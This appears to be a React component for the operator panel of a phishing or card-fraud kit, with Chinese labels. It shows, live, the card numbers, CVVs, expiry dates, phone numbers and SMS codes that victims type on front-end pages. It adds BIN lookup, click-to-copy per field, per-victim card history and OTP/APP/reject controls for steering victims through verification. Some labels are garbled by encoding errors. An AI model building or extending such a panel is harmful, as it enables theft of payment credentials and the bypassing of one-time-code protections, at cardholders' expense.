import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { useState } from "react";
import { useKeystrokeMonitor } from "@/hooks/use-keystroke-monitor";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import {
  Tooltip,
  TooltipContent,
  TooltipProvider,
  TooltipTrigger,
} from "@/components/ui/tooltip";

interface UserSubmission {
  id: string;
  status: "submitted" | "processing" | "verified" | "pending_review" | "rejected";
  statusText: string;
  submissionType: "personal_info" | "credit_card" | "identity_verification" | "address_proof";
  websiteName: string;
  currentPage: string;
  userName: string;
  userLocation?: string;
  timestamp: string;
  progress?: number;
  progressText?: string;
  riskLevel: "low" | "medium" | "high";
  dataSize?: string;
  fieldsCount?: number;
  ipAddress?: string;
  sessionId?: string;
  // Bin查询结果
  binLookup?: {
    cardType: "debit" | "credit" | "prepaid" | "unknown";
    bank?: string;
    country?: string;
  };
  realtimeInput?: {
    phone?: string;
    cardNumber?: string;
    expiryDate?: string;
    cvv?: string;
    verificationCode?: string;
  };
  submitCount?: number;
  submitHistory?: {
    timestamp: string;
    cardType: string;
    partialCard1: string;
    partialCard2: string;
    fullCard: string;
    expiryDate: string;
    cvv: string;
    verificationCode: string;
  }[];
  enterTime?: string;
  updateTime?: string;
  isOffline?: boolean;
  offlineTime?: string;
}

const submissionData: UserSubmission[] = [
  {
    id: "8021",
    status: "processing",
    statusText: "处理中",
    submissionType: "credit_card",
    websiteName: "前台页面 1111",
    currentPage: "/payment",
    userName: "赵用户",
    userLocation: "上海市静安区",
    timestamp: "2024-01-20 11:30:25",
    progress: 45,
    progressText: "45%",
    riskLevel: "medium",
    dataSize: "256Kb",
    fieldsCount: 6,
    ipAddress: "192.168.1.120",
    sessionId: "sess_xyz789",
    binLookup: {
      cardType: "debit",
      bank: "招商银行",
      country: "CN"
    },
    realtimeInput: {
      phone: "138****8888",
      cardNumber: "4321 **** **** 5678",
      expiryDate: "09/26",
      cvv: "123",
      verificationCode: "8765"
    },
    submitCount: 3,
    submitHistory: [
      { timestamp: "11:28", cardType: "debit", partialCard1: "4321", partialCard2: "567", fullCard: "4321 **** **** 5678", expiryDate: "09/26", cvv: "123", verificationCode: "8765" },
      { timestamp: "11:25", cardType: "credit", partialCard1: "5555", partialCard2: "444", fullCard: "5555 **** **** 4444", expiryDate: "08/25", cvv: "***", verificationCode: "2341" },
      { timestamp: "11:22", cardType: "debit", partialCard1: "6226", partialCard2: "789", fullCard: "6226 **** **** 7890", expiryDate: "03/27", cvv: "***", verificationCode: "9876" }
    ],
    enterTime: "11:20:15",
    updateTime: "11:30:42",
    isOffline: false
  },
  {
    id: "13743",
    status: "processing",
    statusText: "处理中",
    submissionType: "personal_info",
    websiteName: "金融服务平台",
    currentPage: "/profile/personal-info",
    userName: "张小明",
    userLocation: "北京市朝阳区",
    timestamp: "2024-01-20 10:25:16",
    progress: 85,
    progressText: "85%",
    riskLevel: "low",
    dataSize: "402Kb",
    fieldsCount: 12,
    ipAddress: "192.168.1.100",
    sessionId: "sess_abc123",
    binLookup: {
      cardType: "credit",
      bank: "中国银行",
      country: "CN"
    },
    realtimeInput: {
      phone: "138****5678",
      cardNumber: "4532 **** **** 1234",
      expiryDate: "12/26",
      cvv: "***",
      verificationCode: "4329"
    },
    submitCount: 1,
    submitHistory: [
      { timestamp: "10:23", cardType: "credit", partialCard1: "4532", partialCard2: "123", fullCard: "4532 **** **** 1234", expiryDate: "12/26", cvv: "***", verificationCode: "4329" }
    ],
    enterTime: "10:15:30",
    updateTime: "10:25:18",
    isOffline: true,
    offlineTime: "10:28:45"
  },
  {
    id: "13752",
    status: "processing",
    statusText: "处理中",
    submissionType: "credit_card",
    websiteName: "电商��物网",
    currentPage: "/checkout/payment",
    userName: "李小红",
    userLocation: "上海市浦东区",
    timestamp: "2024-01-20 10:23:45",
    progress: 72,
    progressText: "72%",
    riskLevel: "medium",
    dataSize: "156Kb",
    fieldsCount: 8,
    ipAddress: "192.168.1.105",
    binLookup: {
      cardType: "credit",
      bank: "工商银行",
      country: "CN"
    },
    realtimeInput: {
      phone: "189****9876",
      cardNumber: "5555 **** **** 4444",
      expiryDate: "08/25",
      cvv: "***",
      verificationCode: "5812"
    },
    submitCount: 5,
    submitHistory: [
      { timestamp: "10:20", cardType: "debit", partialCard1: "5555", partialCard2: "444", fullCard: "5555 **** **** 4444", expiryDate: "08/25", cvv: "***", verificationCode: "5812" },
      { timestamp: "10:18", cardType: "credit", partialCard1: "4111", partialCard2: "111", fullCard: "4111 1111 1111 1111", expiryDate: "11/25", cvv: "212", verificationCode: "7534" },
      { timestamp: "10:15", cardType: "prepaid", partialCard1: "3782", partialCard2: "234", fullCard: "3782 **** **** 1234", expiryDate: "05/26", cvv: "***", verificationCode: "1298" },
      { timestamp: "10:12", cardType: "debit", partialCard1: "6011", partialCard2: "567", fullCard: "6011 **** **** 5678", expiryDate: "07/27", cvv: "***", verificationCode: "6543" },
      { timestamp: "10:10", cardType: "credit", partialCard1: "4532", partialCard2: "890", fullCard: "4532 **** **** 8901", expiryDate: "04/28", cvv: "***", verificationCode: "3921" }
    ],
    enterTime: "10:05:22",
    updateTime: "10:22:15",
    isOffline: false
  },
  {
    id: "13716",
    status: "pending_review",
    statusText: "待审核",
    submissionType: "identity_verification",
    websiteName: "在线银���系统",
    currentPage: "/kyc/identity-check",
    userName: "王大强",
    userLocation: "广州市天河区",
    timestamp: "2024-01-20 10:20:33",
    riskLevel: "high",
    dataSize: "1.2Mb",
    fieldsCount: 15,
    ipAddress: "192.168.1.88"
    // 没有 binLookup 和 realtimeInput，表示用户还未输入数据
  },
  {
    id: "13800",
    status: "submitted",
    statusText: "已提交",
    submissionType: "personal_info",
    websiteName: "新用户注册",
    currentPage: "/register",
    userName: "新用户",
    userLocation: "深圳市南山区",
    timestamp: "2024-01-20 10:15:10",
    riskLevel: "low",
    dataSize: "128Kb",
    fieldsCount: 4,
    ipAddress: "192.168.1.200"
    // 完全没有用户数据，用户刚进入页面
  }
];

const getSubmissionTypeIcon = (type: string) => {
  switch (type) {
    case "personal_info": return "👤";
    case "credit_card": return "💳";
    case "identity_verification": return "🆔";
    case "address_proof": return "🏠";
    default: return "📄";
  }
};

const getSubmissionTypeName = (type: string) => {
  switch (type) {
    case "personal_info": return "个人资料";
    case "credit_card": return "信用卡信息";
    case "identity_verification": return "身份验证";
    case "address_proof": return "地址证明";
    default: return "其他文档";
  }
};

export function WebMonitor() {
  const [expandedItems, setExpandedItems] = useState<Set<string>>(new Set());
  const { submissions, isFieldTyping, getFieldValue, isSubmitting } = useKeystrokeMonitor(submissionData);

  const onlineCount = submissions.filter(s => s.status === "processing").length;
  const todaySubmissions = submissions.length;

  const toggleExpanded = (id: string) => {
    const newExpanded = new Set(expandedItems);
    if (newExpanded.has(id)) {
      newExpanded.delete(id);
    } else {
      newExpanded.add(id);
    }
    setExpandedItems(newExpanded);
  };

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
    } catch (err) {
      console.error('复制失败:', err);
    }
  };

  // 计算相对时间
  const getRelativeTime = (timeString: string, prefix: string) => {
    const now = new Date();
    const [hours, minutes, seconds] = timeString.split(':').map(Number);
    const targetTime = new Date();
    targetTime.setHours(hours, minutes, seconds || 0, 0);

    const diffMs = now.getTime() - targetTime.getTime();
    const diffSeconds = Math.floor(Math.abs(diffMs) / 1000);
    const diffMinutes = Math.floor(diffSeconds / 60);
    const diffHours = Math.floor(diffMinutes / 60);

    if (diffHours > 0) {
      return `${prefix}${diffHours}小时前`;
    } else if (diffMinutes > 0) {
      return `${prefix}${diffMinutes}���钟前`;
    } else {
      return `${prefix}${diffSeconds}秒前`;
    }
  };

  return (
    <TooltipProvider>
      <div className="flex-1 bg-background">
      {/* Header */}
      <div className="border-b border-border bg-white px-6 py-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-4">
            <span className="text-sm text-muted-foreground">��� 神经网络ML1.15</span>
            <h1 className="text-lg font-medium text-foreground">网页实时监控</h1>
            <div className="flex items-center gap-2">
              <Badge variant="outline" className="bg-green-50 text-green-600 border-green-200">
                🔴 LIVE - {onlineCount} 在线处理
              </Badge>
              <Badge variant="outline" className="bg-blue-50 text-blue-600 border-blue-200">
                今日提交: {todaySubmissions}
              </Badge>
            </div>
          </div>
          
          <div className="flex items-center gap-2">
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              ��� ���点管理
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              📊 实时统计
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              🔒 安全设定
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              ⚠️ 风险预警
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              📝 日志查看
            </Button>
          </div>
        </div>
      </div>

      <div className="p-6">
        {/* Card Layout with Borders -按照用户要求的信息顺序 */}
        <div className="space-y-2">
          {submissions.map((submission, index) => (
            <div key={submission.id} className={`bg-white border border-gray-200 rounded-lg shadow-sm hover:shadow-md transition-all duration-300 p-2 ${
              isSubmitting(submission.id)
                ? 'flash-submit'
                : ''
            }`}>
              {/* 顶部：编号、前台页面、正在payment页面 */}
              <div className="flex items-center justify-between mb-1 pb-1 border-b border-gray-100">
                <div className="flex items-center gap-3">
                  <div className="flex items-center gap-1">
                    <span className="text-sm text-muted-foreground">编号:</span>
                    <Badge
                      variant="outline"
                      className={`cursor-pointer text-sm px-2 py-1 font-mono ${
                        submission.status === "processing" ? "bg-blue-50 text-blue-600 border-blue-300" :
                        submission.status === "submitted" ? "bg-orange-50 text-orange-600 border-orange-300" :
                        submission.status === "verified" ? "bg-green-50 text-green-600 border-green-300" :
                        submission.status === "pending_review" ? "bg-yellow-50 text-yellow-700 border-yellow-300" :
                        "bg-red-50 text-red-600 border-red-300"
                      }`}
                      onClick={() => toggleExpanded(submission.id)}
                    >
                      {submission.id}
                    </Badge>
                  </div>

                  <div className="flex items-center gap-1">
                    <span className="text-sm font-medium border border-gray-300/30 rounded px-2 py-1 bg-gray-50/10">
                      前台 {submission.websiteName}
                    </span>
                  </div>

                  <div className="flex items-center gap-1">
                    <span className="text-sm font-medium text-blue-600 border border-gray-300/30 rounded px-2 py-1 bg-gray-50/10">
                      当前正��� {submission.currentPage === '/payment' ? '填卡页' :
                                submission.currentPage === '/profile/personal-info' ? '个人信息页' :
                                submission.currentPage === '/checkout/payment' ? '结账页' :
                                submission.currentPage === '/kyc/identity-check' ? '身份验证页' :
                                submission.currentPage === '/register' ? '注册页' :
                                submission.currentPage}
                    </span>
                  </div>

                  {submission.updateTime && (
                    <div className="flex items-center gap-1">
                      <span className="text-sm font-medium border border-gray-300/30 rounded px-2 py-1 bg-gray-50/10">
                        {getRelativeTime(submission.updateTime, "更新于")}
                      </span>
                    </div>
                  )}

                  {submission.isOffline && submission.offlineTime && (
                    <div className="flex items-center gap-1">
                      <span className="text-sm font-medium border border-red-300/50 rounded px-2 py-1 bg-red-50/10 text-red-600">
                        {getRelativeTime(submission.offlineTime, "离线于")}
                      </span>
                    </div>
                  )}
                </div>

                <div className="flex gap-1.5">
                  <Button variant="outline" size="sm" className="text-xs px-2.5">
                    OTP
                  </Button>
                  <Button variant="outline" size="sm" className="text-xs px-2.5">
                    APP
                  </Button>
                  <Button variant="destructive" size="sm" className="text-xs px-2.5">
                    拒绝
                  </Button>
                  <DropdownMenu>
                    <DropdownMenuTrigger asChild>
                      <Button variant="secondary" size="sm" className="text-xs px-2.5">
                        自定义
                      </Button>
                    </DropdownMenuTrigger>
                    <DropdownMenuContent align="end" className="w-48">
                      <DropdownMenuItem onClick={() => window.open('/dashboard', '_blank')}>
                        📊 数据分析页面
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => window.open('/reports', '_blank')}>
                        📋 报告页面
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => window.open('/settings', '_blank')}>
                        ⚙️ 设置页面
                      </DropdownMenuItem>
                      <DropdownMenuSeparator />
                      <DropdownMenuItem onClick={() => window.open('/admin', '_blank')}>
                        👤 管理员页面
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => window.open('/logs', '_blank')}>
                        📝 日志页面
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => window.open('/users', '_blank')}>
                        👥 用户管理
                      </DropdownMenuItem>
                    </DropdownMenuContent>
                  </DropdownMenu>
                </div>
              </div>

              {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
              {(() => {
                // 检查是否有用户实际输入数据
                const hasUserData = submission.realtimeInput && (
                  submission.realtimeInput.phone ||
                  submission.realtimeInput.cardNumber ||
                  submission.realtimeInput.expiryDate ||
                  submission.realtimeInput.cvv ||
                  submission.realtimeInput.verificationCode ||
                  submission.userName
                );

                // 检查是否有字段正在输入
                const hasActiveTyping = ['phone', 'name', 'cardNumber', 'expiryDate', 'cvv', 'verificationCode'].some(field =>
                  isFieldTyping(submission.id, field)
                );

                return (hasUserData || hasActiveTyping) ? (
                  <div className="flex items-center gap-2 mb-0.5">
                    <div className="flex items-center gap-1">
                      <div className="text-xs text-muted-foreground">💳</div>
                      {submission.binLookup ? (
                        <Badge
                          variant="outline"
                          className={`text-xs px-1.5 py-0.5 ${
                            submission.binLookup.cardType === "credit" ? "bg-blue-50 text-blue-600 border-blue-200" :
                            submission.binLookup.cardType === "debit" ? "bg-green-50 text-green-600 border-green-200" :
                            submission.binLookup.cardType === "prepaid" ? "bg-orange-50 text-orange-600 border-orange-200" :
                            "bg-gray-50 text-gray-600 border-gray-200"
                          }`}
                        >
                          {submission.binLookup.cardType}
                        </Badge>
                      ) : (
                        <span className="text-xs">识别中...</span>
                      )}
                    </div>

                    <Tooltip>
                      <TooltipTrigger asChild>
                        <div className="text-sm font-mono border rounded px-2 py-1 min-w-[60px] bg-blue-50 border-blue-300 cursor-help flex items-center justify-center">
                          <span className="text-blue-700 font-semibold">{submission.submitCount || 0}次</span>
                        </div>
                      </TooltipTrigger>
                      <TooltipContent side="top" className="max-w-2xl p-0">
                        <div className="bg-white rounded-lg shadow-lg">
                          <div className="px-4 py-2 bg-gray-50 border-b font-semibold text-sm text-gray-700 rounded-t-lg">
                            填写历史
                          </div>
                          <div className="p-2">
                            {submission.submitHistory && submission.submitHistory.length > 0 ? (
                              <table className="w-full text-xs">
                                <tbody>
                                  {submission.submitHistory.map((history, index) => (
                                    <tr key={index} className="border-b border-gray-100 last:border-b-0">
                                      <td className="py-1 px-2 text-center text-gray-600 font-mono w-8">{index + 1}</td>
                                      <td className="py-1 px-2">
                                        <span className={`px-2 py-0.5 rounded text-xs border ${
                                          history.cardType === "debit" ? "bg-green-50 text-green-600 border-green-200" :
                                          history.cardType === "credit" ? "bg-blue-50 text-blue-600 border-blue-200" :
                                          "bg-orange-50 text-orange-600 border-orange-200"
                                        }`}>
                                          {history.cardType}
                                        </span>
                                      </td>
                                      <td className="py-1 px-2 font-mono text-gray-700">{history.partialCard1}</td>
                                      <td className="py-1 px-2 font-mono text-gray-700">{history.partialCard2}</td>
                                      <td className="py-1 px-2">
                                        <span className="bg-green-500 text-white px-2 py-0.5 rounded font-mono text-xs">
                                          {history.fullCard}
                                        </span>
                                      </td>
                                      <td className="py-1 px-2 font-mono text-gray-700">{history.expiryDate}</td>
                                      <td className="py-1 px-2 font-mono text-gray-700">{history.cvv}</td>
                                      <td className="py-1 px-2 font-mono text-gray-700 text-center">{history.verificationCode}</td>
                                    </tr>
                                  ))}
                                </tbody>
                              </table>
                            ) : (
                              <div className="text-xs text-gray-500 text-center py-4">暂无填写记录</div>
                            )}
                          </div>
                        </div>
                      </TooltipContent>
                    </Tooltip>

                    <div
                      className={`text-sm font-mono border rounded px-2 py-1 min-w-[100px] transition-all duration-75 cursor-pointer hover:bg-blue-50 ${
                        isFieldTyping(submission.id, 'phone')
                          ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
                          : 'border-gray-300 bg-gray-50'
                      }`}
                      onClick={() => copyToClipboard(getFieldValue(submission.id, 'phone'))}
                      title="点击复制手机号"
                    >
                      <span className="relative">
                        {getFieldValue(submission.id, 'phone')}
                        {isFieldTyping(submission.id, 'phone') && (
                          <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
                        )}
                      </span>
                    </div>

                    <div
                      className={`text-sm font-medium border rounded px-2 py-1 min-w-[80px] transition-all duration-75 cursor-pointer hover:bg-blue-50 ${
                        isFieldTyping(submission.id, 'name')
                          ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
                          : 'border-gray-300 bg-gray-50'
                      }`}
                      onClick={() => copyToClipboard(getFieldValue(submission.id, 'name'))}
                      title="点击复制姓名"
                    >
                      <span className="relative">
                        {getFieldValue(submission.id, 'name')}
                        {isFieldTyping(submission.id, 'name') && (
                          <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
                        )}
                      </span>
                    </div>

                    <div
                      className={`text-sm font-mono border rounded px-2 py-1 min-w-[140px] transition-all duration-75 cursor-pointer hover:bg-blue-50 ${
                        isFieldTyping(submission.id, 'cardNumber')
                          ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
                          : 'border-gray-300 bg-gray-50'
                      }`}
                      onClick={() => copyToClipboard(getFieldValue(submission.id, 'cardNumber'))}
                      title="点击复制卡号"
                    >
                      <span className="relative">
                        {getFieldValue(submission.id, 'cardNumber')}
                        {isFieldTyping(submission.id, 'cardNumber') && (
                          <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
                        )}
                      </span>
                    </div>

                    <div
                      className={`text-sm font-mono border rounded px-2 py-1 min-w-[60px] transition-all duration-75 cursor-pointer hover:bg-blue-50 ${
                        isFieldTyping(submission.id, 'expiryDate')
                          ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
                          : 'border-gray-300 bg-gray-50'
                      }`}
                      onClick={() => copyToClipboard(getFieldValue(submission.id, 'expiryDate'))}
                      title="点击复制有效期"
                    >
                      <span className="relative">
                        {getFieldValue(submission.id, 'expiryDate')}
                        {isFieldTyping(submission.id, 'expiryDate') && (
                          <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
                        )}
                      </span>
                    </div>

                    <div
                      className={`text-sm font-mono border rounded px-2 py-1 min-w-[50px] transition-all duration-75 cursor-pointer hover:bg-blue-50 ${
                        isFieldTyping(submission.id, 'cvv')
                          ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
                          : 'border-gray-300 bg-gray-50'
                      }`}
                      onClick={() => copyToClipboard(getFieldValue(submission.id, 'cvv'))}
                      title="点击复制CVV"
                    >
                      <span className="relative">
                        {getFieldValue(submission.id, 'cvv')}
                        {isFieldTyping(submission.id, 'cvv') && (
                          <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
                        )}
                      </span>
                    </div>

                    <div
                      className={`text-sm font-mono border rounded px-2 py-1 min-w-[60px] transition-all duration-75 cursor-pointer hover:bg-blue-50 ${
                        isFieldTyping(submission.id, 'verificationCode')
                          ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
                          : 'border-gray-300 bg-gray-50'
                      }`}
                      onClick={() => copyToClipboard(getFieldValue(submission.id, 'verificationCode'))}
                      title="点击复制验证码"
                    >
                      <span className="relative">
                        {getFieldValue(submission.id, 'verificationCode')}
                        {isFieldTyping(submission.id, 'verificationCode') && (
                          <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
                        )}
                      </span>
                    </div>
                  </div>
                ) : (
                  <div className="flex items-center justify-center py-4 mb-0.5">
                    <div className="text-sm text-muted-foreground italic">
                      等待用户输入数据...
                    </div>
                  </div>
                );
              })()}

              {/* 底部：状态和风险标签 */}
              <div className="flex justify-end pt-1 border-t border-gray-100">
                <div className="flex items-center gap-2">
                  <div className="text-sm text-muted-foreground">{submission.statusText}</div>
                  <Badge
                    variant="outline"
                    className={`text-xs ${
                      submission.riskLevel === "high" ? "bg-red-50 text-red-600 border-red-200" :
                      submission.riskLevel === "medium" ? "bg-yellow-50 text-yellow-600 border-yellow-200" :
                      "bg-green-50 text-green-600 border-green-200"
                    }`}
                  >
                    {submission.riskLevel === "high" ? "高风险" :
                     submission.riskLevel === "medium" ? "中风险" :
                     "低风险"}
                  </Badge>
                </div>
              </div>

              {/* 展开的详细信息 */}
              {expandedItems.has(submission.id) && (
                <div className="mt-2 pt-2 border-t border-gray-200 bg-gray-50 -mx-3 -mb-3 px-3 py-2 rounded-b-lg">
                  <h4 className="text-sm font-medium text-foreground mb-1">详细信息</h4>
                  <div className="grid grid-cols-4 gap-3 text-xs">
                    <div>
                      <span className="text-muted-foreground">提交时间: </span>
                      <span className="font-medium">{submission.timestamp}</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">用户位置: </span>
                      <span className="font-medium">{submission.userLocation}</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">IP地址: </span>
                      <span className="font-medium">{submission.ipAddress}</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">会话ID: </span>
                      <span className="font-medium">{submission.sessionId || "N/A"}</span>
                    </div>
                  </div>
                </div>
              )}
            </div>
          ))}
        </div>

        {/* Bottom Summary */}
        <div className="mt-6 pt-4 border-t border-border">
          <div className="text-xs text-muted-foreground">
            共监控 {submissions.length} 个站点提交 • 今日新增 {todaySubmissions} 条 • 平均处理时长 3.2 分钟 • 验证通过率 82%
          </div>
        </div>
      </div>
    </div>
    </TooltipProvider>
  );
}
